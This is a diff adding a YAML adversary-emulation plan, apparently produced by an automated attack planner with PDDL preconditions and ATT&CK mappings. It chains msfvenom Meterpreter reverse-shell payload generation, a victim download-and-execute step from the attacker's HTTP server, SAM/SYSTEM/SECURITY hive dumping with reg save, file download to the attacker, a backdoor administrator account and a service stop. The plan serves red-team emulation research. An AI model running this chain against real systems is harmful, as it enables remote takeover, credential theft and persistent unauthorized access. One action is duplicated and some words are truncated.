@@ -1,0 +1,504 @@
+emulation_plan_details:
+  adversary_name: env0
+  creation_time: 2026-07-15 05:28:41 UTC+0000
+  parent_chain_idx: 144
+  internal_chain_idx: 171
+  stage_outcomes:
+    - stage: initial-executor
+      status: succeeded
+      plan_source: attack_plan-5.yml
+    - stage: discovery-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: credential-access-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: persistence-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: privilege-escalation-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: collection-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: exfiltration-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: impact-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: lateral-movement-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+attack_action_sequence:
+  - uuid: msfvenom-1
+    name: Build the executable file of a Meterpreter session (for Windows) using MSFVenom
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command uses MSFVenom to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: MSFVenom Console
+      command: |
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe -o #{SAVE_PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        required: true
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        pddl_index: string0_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+    effects:
+      - (meterpreter-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?file - file)
+      - (file-on-attacker ?path - string ?file - file)
+      - (standalone-exe-file ?file - file)
+  - uuid: set-msf-payload-handler-for-file
+    name: Set an MSF payload handler for a file-backed payload
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - Windows Command Shell
+      - Ingress Tool Transfer
+      - Non-Standard Por
+    description: |
+      Same MSF `exploit/multi/handler` mechanism as `set-msf-payload-handler`, but
+      for the case where the meterpreter payload has been (or will be) staged as a
+      file on the victim.
+
+      This variant additionally grants `(callback-covered ?file)` for the payload's
+      file — the gate that every execute-* action requires before running that file.
+      Payload-genesis actions (msfvenom) deliberately do NOT produce
+      `callback-covered`, so payload files are born uncovered; firing this action
+      is what makes them safe to execute. This forces the planner to sequence
+      handler-set before any execute-* on the payload file — the ordering
+      constraint is encoded directly in PDDL preconditions.
+
+      Use `set-msf-payload-handler` (no file) for fileless delivery: reflective
+      loading, in-memory shellcode injection, staged callback with no on-disk
+      artifact.
+    execution:
+      executor: Metasploit Executor
+      command: |
+        exploit_and_execute_payload(exploit_module_name = "exploit/multi/handler",
+                                    payload_module_name = "#{payload_name}",
+                                    listening_host = "#{LHOST}",
+                                    listening_port = "#{LPORT}"):
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      payload_name:
+        default:
+        description: payload type set by msf
+        type:
+    preconditions:
+      - (meterpreter-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?file - file)
+    effects:
+      - (payload-handler-set ?p - payload)
+      - (callback-covered ?file - file)
+  - uuid: simulate-download-execute-file
+    name: Simulate the victim download and execute malicious payload file
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:8000 in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        required: true
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string1_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - operator: or
+        operands:
+          - (os-linux ?target - host)
+          - (os-windows ?target - host)
+          - (os-macos ?target - host)
+      - (file-on-attacker ?localpath - string ?file - file)
+      - operator: or
+        operands:
+          - (standalone-exe-file ?file - file)
+          - (elf-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (file-executed ?file - file ?target - host)
+  - uuid: execute-meterpreter-payload-file
+    name: Execute a Meterpreter Payload
+    id:
+      - T1071.001
+    source: Meterpreter
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Meterpreter payload will establish a Meterpreter session.
+    execution:
+      executor: Meterpreter Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (meterpreter-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (meterpreter-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: meterpreter-getpid
+    name: Get Current Process ID
+    id:
+      - T1057
+    source: Metasploit
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Discovery
+    technique:
+      - Process Discovery
+    description: The `getpid` command returns the PID of the meterpreter agent process
+      on the target.
+    execution:
+      executor: Meterpreter Executor
+      command: getpid(meterpreter_sessionid=#{executor})
+    arguments:
+      executor:
+        description: The Meterpreter session ID of the active Metasploit connection.
+        required: true
+        pddl_index: executor4_var_in_plan
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter-session ?executorID - executor ?target - host)
+    effects:
+      - (process-info-known ?target - host)
+  - uuid: simulate-execute-lnk-windows-root
+    name: Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged
+      executable as Admin
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description: |
+      This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On victim's machine, on the desktop or a folder)
+        Right-click a shortcut (.lnk) whose target is:
+        #{EXE_PATH}
+        then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
+    arguments:
+      EXE_PATH:
+        default:
+        description: Path of the executable the shortcut points at
+        required: true
+        pddl_index: string1_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - (os-windows ?target - host)
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (standalone-exe-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-executed-elevated ?file - file ?target - host)
+  - uuid: execute-meterpreter-payload-file
+    name: Execute a Meterpreter Payload
+    id:
+      - T1071.001
+    source: Meterpreter
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Meterpreter payload will establish a Meterpreter session.
+    execution:
+      executor: Meterpreter Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (meterpreter-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (meterpreter-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: meterpreter-shell-windows
+    name: Get an Interactive Shell on Windows
+    id:
+      - T1059.003
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - Command and Scripting Interpreter: Windows Command Shell
+    description: The `shell` command in a Windows meterpreter session drops into an
+      interactive cmd.exe.
+    execution:
+      executor: Meterpreter Session Derive
+      command: |
+        # no-op — derivation only
+    arguments:
+      executor:
+        description: The Meterpreter session ID of the active Metasploit connection.
+        required: true
+        pddl_index: executor3_var_in_plan
+      executor_parent:
+        description: Parent meterpreter session ID
+        required: true
+        pddl_index: executor3_var_in_plan
+      executor_derived:
+        description: The derived Windows CMD executor.
+        required: true
+        pddl_index: executor2_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (meterpreter-session ?executorID - executor ?target - host)
+    effects:
+      - (command-prompt ?s2 - executor ?target - host)
+      - operator: When
+        params:
+          condition: (elevated-executor ?executorID - executor)
+          effect: (elevated-executor ?s2 - executor)
+  - uuid: art-t1003_002-reg-save-sam
+    name: Registry dump of SAM, creds, and secrets
+    id:
+      - T1003.002
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Credential Access
+    technique:
+      - 'OS Credential Dumping: Security Account Manager'
+    description: |
+      `reg save` writes the SAM, SYSTEM and SECURITY registry hives to a
+      target-side directory (default `%TEMP%`). The hives hold encrypted /
+      structured credential material — offline processing (impacket-
+      secretsdump, creddump7, PowerDump, …) is a separate step and is NOT
+      modelled by this action. A chain that wants to close the credential-
+      access stage via this path must include downstream file exfil +
+      offline-parse actions. ART auto_generated_guid
+      5c2571d0-1572-416d-9676-812e64ca9f44.
+    execution:
+      executor: Command Prompt Executor
+      command: |
+        reg save HKLM\sam #{save_dir}\sam
+        reg save HKLM\system #{save_dir}\system
+        reg save HKLM\security #{save_dir}\security
+    arguments:
+      executor:
+        description: The Command Prompt session ID used to invoke reg save.
+        required: true
+        pddl_index: executor2_var_in_plan
+      save_dir:
+        default: '%TEMP%'
+        description: Directory on the target where the SAM / SYSTEM / SECURITY hives
+          are written.
+        required: true
+        pddl_index: string2_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (command-prompt ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (credential-data ?d - data ?target - host)
+      - (data-stored-in-file ?d - data ?f - file)
+      - (file-exists ?path - string ?f - file ?target - host)
+      - (callback-covered ?f - file)
+  - uuid: meterpreter-download
+    name: File Download Operation
+    id:
+      - T1020
+    source: Metasploit
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Collection
+    technique:
+      - Data from Local System
+    description: The `download` command transfers files from the target system to
+      the attacker machine.
+    execution:
+      executor: Meterpreter Executor
+      command: download(remote_path=#{remote_path}, local_path=#{output_dir}, meterpreter_sessionid=#{executor})
+    arguments:
+      executor:
+        description: The Meterpreter session ID of the active Metasploit connection.
+        required: true
+        pddl_index: executor4_var_in_plan
+      remote_path:
+        description: Full path to remote file/directory
+        required: true
+        pddl_index: string2_var_in_plan
+      output_dir:
+        default: /tmp
+        description: Local directory to save files
+        required: true
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (meterpreter-session ?executorID - executor ?target - host)
+      - (file-exists ?remote_path - string ?file - file ?target - host)
+    effects:
+      - (file-on-attacker ?localpath - string ?file - file)
+  - uuid: art-t1136_001-net-user-admin
+    name: Create a new Windows admin user
+    id:
+      - T1136.001
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Persistence
+    technique:
+      - 'Create Account: Local Account'
+    description: |
+      Creates a new local account and adds it to the local `administrators`
+      group in one shot. Strong persistence pattern — attacker gains a
+      privileged backdoor account. ART auto_generated_guid
+      fda74566-a604-4581-a4cc-fbbe21d66559.
+    execution:
+      executor: Command Prompt Executor
+      command: |
+        net user /add "#{username}" "#{password}"
+        net localgroup administrators "#{username}" /add
+    arguments:
+      executor:
+        description: The Command Prompt session ID used to invoke net.
+        required: true
+        pddl_index: executor2_var_in_plan
+      username:
+        default: BackupAdmin
+        description: Local admin account name to create.
+        required: true
+      password:
+        default: ComplexPass!23
+        description: Password for the new admin account.
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (command-prompt ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (user-created ?u - user ?target - host)
+  - uuid: art-t1489-net-stop-service
+    name: Windows - Stop service using net.exe
+    id:
+      - T1489
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Impact
+    technique:
+      - Service Stop
+    description: |
+      Stops a Windows service via `net stop`. Functionally identical to
+      sc.exe stop; different binary/command surface for detection variety.
+      ART auto_generated_guid 41274289-ec9c-4213-bea4-e43c4aa57954.
+    execution:
+      executor: Command Prompt Executor
+      command: |
+        net.exe stop #{service_name}
+    arguments:
+      executor:
+        description: The Command Prompt session ID used to invoke net.
+        required: true
+        pddl_index: executor2_var_in_plan
+      service_name:
+        default: spooler
+        description: Name of the Windows service to stop.
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (command-prompt ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (process-terminated ?p - process ?target - host)
